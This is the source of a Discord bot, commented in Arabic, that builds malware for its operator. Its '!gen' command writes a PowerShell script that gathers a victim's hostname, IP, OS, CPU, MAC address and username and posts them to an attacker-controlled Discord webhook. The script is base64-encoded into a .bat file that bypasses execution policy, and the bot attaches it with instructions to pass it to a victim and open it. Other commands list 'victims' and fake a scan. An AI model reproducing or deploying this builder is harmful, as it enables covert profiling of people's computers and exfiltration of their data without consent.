const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const fs = require('fs');
const path = require('path');

// --- إعدادات البوت ---
const TOKEN = 'ضع_التوكن_هنا'; // ضع توكن البوت هنا
const WEBHOOK_URL = 'https://discord.com/api/webhooks/ID_TOKEN'; // ويب هوك لاستلام البيانات من الضحايا

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

// قاعدة بيانات الضحايا
let victims = [];

client.once('ready', () => {
    console.log(`✅ ${client.user.tag} متصل`);
    client.user.setPresence({
        status: 'online',
        activity: { name: `🔍 | ${victims.length} ضحية`, type: 'WATCHING' }
    });
});

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    
    const args = message.content.trim().split(' ');
    const command = args[0].toLowerCase();
    
    switch(command) {
        case '!gen':
            generatePayload(message);
            break;
            
        case '!list':
            listVictims(message);
            break;
            
        case '!help':
            showHelp(message);
            break;
            
        default:
            // استقبال البيانات من الويب هوك (إذا كان البوت يستقبلها عبر API خارجي)
            // أو يمكنك استخدام أمر !scan لإرسال معلومات وهمية للتجربة
            if (command === '!scan') {
                scanSimulation(message);
            }
    }
});

// دالة توليد ملف التلغيم (Payload)
async function generatePayload(message) {
    try {
        // كود PowerShell الذي سيقوم بجمع المعلومات وإرسالها للويب هوك
        const payloadCode = `
$computerSystem = Get-CimInstance -ClassName Win32_ComputerSystem
$osInfo = Get-CimInstance -ClassName Win32_OperatingSystem
$cpuInfo = Get-CimInstance -ClassName Win32_Processor
$macAddress = Get-NetAdapter | Select-Object -First 1 | Select-Object MacAddress

$payload = @{
    "Hostname" = $computerSystem.Name
    "IP" = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1 | Select-Object -ExpandProperty IPV4Address).IPAddressToString
    "OS" = "$($osInfo.Caption) $($osInfo.Version)"
    "CPU" = $cpuInfo.Name
    "MAC" = $macAddress.MacAddress
    "User" = $env:USERNAME
    "Time" = (Get-Date).ToString()
}

$jsonPayload = ConvertTo-Json $payload

# إرسال البيانات إلى الويب هوك الخاص بالبوت
Invoke-RestMethod -Uri "${WEBHOOK_URL}" -Method Post -Body $jsonPayload -ContentType "application/json"
`;

        // تحويل الكود إلى Base64 لتجنب مشاكل المسافات والعلامات
        const utf8Bytes = Buffer.from(payloadCode);
        const base64Payload = utf8Bytes.toString('base64');

        // إنشاء ملف .bat بسيط لتشغيل الكود
        const batContent = `powershell.exe -ExecutionPolicy Bypass -EncodedCommand ${base64Payload}`;
        
        // حفظ الملف محلياً
        const fileName = `payload_${Date.now()}.bat`;
        const filePath = path.join(__dirname, fileName);
        fs.writeFileSync(filePath, batContent, 'utf8');

        // إرسال الملف للمستخدم
        const embed = new EmbedBuilder()
            .setTitle('📦 ملف التلغيم جاهز')
            .setDescription('تم توليد الملف بنجاح. اضغط على الرابط أدناه لتحميله:')
            .setColor('#00ff00')
            .setFooter({ text: 'انقل الملف للضحية وافتحه' });

        // نحتاج لرابط مباشر للملف، إذا كنت تستخدم استضافة مثل GitHub Pages أو سيرفر خاص
        // هنا سنفترض أنك سترفع الملف يدوياً أو نرسله كملف مرفق
        await message.channel.send({ 
            content: 'إليك ملف التلغيم:', 
            files: [{ attachment: filePath, name: fileName }] 
        });

        // حذف الملف بعد الإرسال لتنظيف السيرفر
        setTimeout(() => {
            fs.unlinkSync(filePath);
        }, 60000); // يحذف بعد دقيقة

    } catch (error) {
        console.error(error);
        message.reply('❌ حدث خطأ أثناء توليد الملف.');
    }
}

// محاكاة فحص الجهاز
function scanSimulation(message) {
    const embed = new EmbedBuilder()
        .setTitle('🔍 فحص الجهاز')
        .addFields(
            { name: 'اسم الجهاز', value: 'PC-USER01', inline: true },
            { name: 'نظام التشغيل', value: 'Windows 11 Pro', inline: true },
            { name: 'العنوان IP', value: '192.168.1.' + Math.floor(Math.random() * 255), inline: true },
            { name: 'الحالة', value: '✅ متصل', inline: false }
        )
        .setColor('#00ff00');
    
    message.channel.send({ embeds: [embed] });
}

function listVictims(message) {
    if (victims.length === 0) {
        return message.channel.send('لا توجد ضحايا حالياً.');
    }
    
    const embed = new EmbedBuilder()
        .setTitle('📋 قائمة الضحايا')
        .setDescription(victims.map((v, i) => `${i+1}. **${v.hostname}** (${v.ip})`).join('\n'))
        .setColor('#ffff00');
        
    message.channel.send({ embeds: [embed] });
}

function showHelp(message) {
    const embed = new EmbedBuilder()
        .setTitle('❓ الأوامر المتاحة')
        .setDescription(`
**!gen** - توليد ملف التلغيم (Payload)
**!list** - عرض قائمة الضحايا
**!scan** - محاكاة فحص جهاز
        `)
        .setColor('#00aaff');
        
    message.channel.send({ embeds: [embed] });
}

client.login(TOKEN);